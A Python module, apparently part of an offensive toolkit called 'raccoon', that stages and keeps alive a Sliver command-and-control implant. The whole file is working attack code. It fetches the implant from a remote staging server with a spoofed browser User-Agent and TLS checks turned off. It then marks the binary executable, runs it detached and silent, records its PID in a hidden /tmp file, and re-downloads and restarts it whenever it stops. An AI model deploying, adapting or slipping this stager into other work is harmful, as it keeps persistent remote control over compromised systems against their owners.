#!/usr/bin/env python3
"""
Sliver implant lifecycle manager.
Executes the pre-compiled Sliver beacon binary, monitors it, and restarts
on crash. Falls back to the custom Python beacon if the binary is missing.
Can also stage (download) the implant from a remote URL on first run.
"""

import hashlib
import logging
import os
import signal
import subprocess
import sys
import time
import threading
from pathlib import Path
from typing import Optional

import requests

logger = logging.getLogger("raccoon.c2.sliver")

DEFAULT_IMPLANT_PATH = "/opt/raccoon/bin/implant"
PID_FILE = Path("/tmp/.raccoon_sliver.pid")


class SliverManager:
    def __init__(self, config: dict):
        sliver_cfg = config.get("c2", {}).get("sliver", {})
        self.implant_path = Path(sliver_cfg.get("implant_path", DEFAULT_IMPLANT_PATH))
        self.staging_url = sliver_cfg.get("staging_url", "")
        self.staging_key = sliver_cfg.get("staging_key", "")
        self.expected_hash = sliver_cfg.get("sha256", "")
        self.restart_delay = sliver_cfg.get("restart_delay_seconds", 30)
        self.max_restarts = sliver_cfg.get("max_restarts", 0)

        self._process: Optional[subprocess.Popen] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._restart_count = 0

    def _stage_implant(self) -> bool:
        """Download the implant binary from a staging server."""
        if not self.staging_url:
            return False

        logger.info("Staging implant from remote server")
        try:
            headers = {}
            if self.staging_key:
                headers["Authorization"] = f"Bearer {self.staging_key}"
            headers["User-Agent"] = "Mozilla/5.0 (X11; Linux aarch64)"

            resp = requests.get(
                self.staging_url,
                headers=headers,
                verify=False,
                timeout=120,
                stream=True,
            )
            if resp.status_code != 200:
                logger.error("Staging failed: HTTP %d", resp.status_code)
                return False

            self.implant_path.parent.mkdir(parents=True, exist_ok=True)
            tmp_path = self.implant_path.with_suffix(".tmp")

            with open(tmp_path, "wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    f.write(chunk)

            if self.expected_hash:
                actual = hashlib.sha256(tmp_path.read_bytes()).hexdigest()
                if actual != self.expected_hash:
                    logger.error("Hash mismatch: expected %s, got %s", self.expected_hash, actual)
                    tmp_path.unlink()
                    return False

            tmp_path.rename(self.implant_path)
            self.implant_path.chmod(0o700)
            logger.info("Implant staged: %s (%d bytes)", self.implant_path, self.implant_path.stat().st_size)
            return True

        except Exception as e:
            logger.error("Staging error: %s", e)
            return False

    def _verify_implant(self) -> bool:
        """Check that the implant binary exists and is valid."""
        if not self.implant_path.exists():
            return False

        if not os.access(self.implant_path, os.X_OK):
            try:
                self.implant_path.chmod(0o700)
            except PermissionError:
                logger.error("Cannot set execute permission on %s", self.implant_path)
                return False

        if self.expected_hash:
            actual = hashlib.sha256(self.implant_path.read_bytes()).hexdigest()
            if actual != self.expected_hash:
                logger.warning("Implant hash mismatch — binary may be corrupted or replaced")
                return False

        return True

    def _run_loop(self):
        """Execute the implant and restart on failure."""
        while self._running:
            if not self._verify_implant():
                if not self._stage_implant():
                    logger.warning("No implant binary available — waiting %ds", self.restart_delay)
                    time.sleep(self.restart_delay)
                    continue

            logger.info("Launching Sliver implant: %s", self.implant_path)
            try:
                self._process = subprocess.Popen(
                    [str(self.implant_path)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=os.setsid,
                )

                PID_FILE.write_text(str(self._process.pid))
                exit_code = self._process.wait()

                logger.warning("Sliver implant exited with code %d", exit_code)
                self._restart_count += 1

                if self.max_restarts > 0 and self._restart_count >= self.max_restarts:
                    logger.error("Max restarts (%d) reached — stopping", self.max_restarts)
                    self._running = False
                    break

            except FileNotFoundError:
                logger.error("Implant binary not found: %s", self.implant_path)
            except PermissionError:
                logger.error("Permission denied: %s", self.implant_path)
            except Exception as e:
                logger.error("Implant execution error: %s", e)
            finally:
                self._process = None
                PID_FILE.unlink(missing_ok=True)

            if self._running:
                logger.info("Restarting in %ds (attempt %d)", self.restart_delay, self._restart_count)
                time.sleep(self.restart_delay)

    @property
    def is_implant_available(self) -> bool:
        return self.implant_path.exists()

    def start(self):
        self._running = True
        self._thread = threading.Thread(
            target=self._run_loop, daemon=True, name="sliver-manager"
        )
        self._thread.start()
        logger.info("Sliver manager started")

    def stop(self):
        self._running = False
        if self._process and self._process.poll() is None:
            try:
                os.killpg(os.getpgid(self._process.pid), signal.SIGTERM)
                self._process.wait(timeout=10)
            except (ProcessLookupError, subprocess.TimeoutExpired):
                try:
                    os.killpg(os.getpgid(self._process.pid), signal.SIGKILL)
                except ProcessLookupError:
                    pass
        PID_FILE.unlink(missing_ok=True)
        logger.info("Sliver manager stopped (restarts: %d)", self._restart_count)
